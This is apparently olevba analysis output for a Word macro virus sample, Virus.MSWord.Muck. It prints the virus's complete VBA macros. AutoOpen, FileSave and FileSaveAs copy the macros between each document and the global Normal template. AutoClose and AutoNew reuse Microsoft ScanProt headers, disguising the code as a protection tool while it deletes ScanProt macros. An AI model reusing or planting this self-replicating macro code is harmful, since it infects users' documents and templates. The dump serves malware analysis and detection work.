olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Muck-8783c06591abd3ff5d46da8767aeb341ce7de01e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Muck-8783c06591abd3ff5d46da8767aeb341ce7de01e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Muck-8783c06591abd3ff5d46da8767aeb341ce7de01e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Attribute Main.VB_Description = "Runs AutoOpenScan"
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.Main"
Dim ExecuteOnly
If WordBasic.Int(Rnd(1) * 5) = 4 Then WordBasic.MsgBox "MUCK"
On Error Resume Next
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExit", "Global:AutoExit", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSaveAs", "Global:FileSaveAs", ExecuteOnly


WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
WordBasic.FileSaveAll 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Muck-8783c06591abd3ff5d46da8767aeb341ce7de01e - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' ******************************************************************
' Macro   : AutoClose
' Created : August 11, 1995
' Copyright (c) 1995 Microsoft Corp.
' Description : detects and removes Concept Virus from document
' being closed
' *****************************************************************
Dim closeMsg$, msgTitle$

Private Sub Localize()
'**** Insert string translation here ****'
    closeMsg$ = "Setup has deleted the obsolete protection macros from your Normal (global) template."
    msgTitle$ = "ScanProt Setup"
'**** End String Translation ****'
End Sub

Public Sub Main()
Attribute Main.VB_Description = "Deletes old Scanprot macros if necessary"
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.Main"
Dim deleted
closeMsg$ = ""
msgTitle$ = ""
Localize
deleted = 0
'cleanup if this is an upgrade
    'check for the ScanOld protective macros
    If WordBasic.[MacroFileName$]("ShellOpenScanOld") <> "" Then
        WordBasic.ToolsMacro Name:="ShellOpenScanOld", Show:=1, Delete:=1
        deleted = 1
    End If
    If WordBasic.[MacroFileName$]("ScanProt1") <> "" Then
        WordBasic.ToolsMacro Name:="ScanProt1", Show:=1, Delete:=1
        deleted = 1
    End If
    If WordBasic.[MacroFileName$]("ScanProt2") <> "" Then
        WordBasic.ToolsMacro Name:="ScanProt2", Show:=1, Delete:=1
        deleted = 1
    End If
    If deleted = 1 Then WordBasic.MsgBox closeMsg$, msgTitle$, 64
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Muck-8783c06591abd3ff5d46da8767aeb341ce7de01e - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' ******************************************************************
' Macro   : AutoNew
' Created : Sept. 20, 1995
' Copyright (c) 1995 Microsoft Corp.
' *****************************************************************

Public Sub Main()
Attribute Main.VB_Description = "Runs AutoOpenScan"
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoNew.Main"
   WordBasic.Call "AutoOpen.Main"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: Virus.MSWord.Muck-8783c06591abd3ff5d46da8767aeb341ce7de01e - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Attribute Main.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExit.Main"
If WordBasic.Int(Rnd(1) * 5) = 4 Then WordBasic.MsgBox "MUCK"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: Virus.MSWord.Muck-8783c06591abd3ff5d46da8767aeb341ce7de01e - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Attribute Main.VB_Description = "Saves the active document or template"
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.Main"
Dim ExecuteOnly
On Error Resume Next
WordBasic.FileSave
WordBasic.FileSaveAs Format:=1
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
If WordBasic.Int(Rnd(1) * 5) = 4 Then WordBasic.MsgBox "MUCK"
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Muck-8783c06591abd3ff5d46da8767aeb341ce7de01e - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()
Attribute Main.VB_Description = "Saves a copy of the document in a separate file"
Attribute Main.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.Main"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
WordBasic.FileSaveAs dlg
WordBasic.FileSaveAs Format:=1
If WordBasic.Int(Rnd(1) * 5) = 4 Then WordBasic.MsgBox "MUCK"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

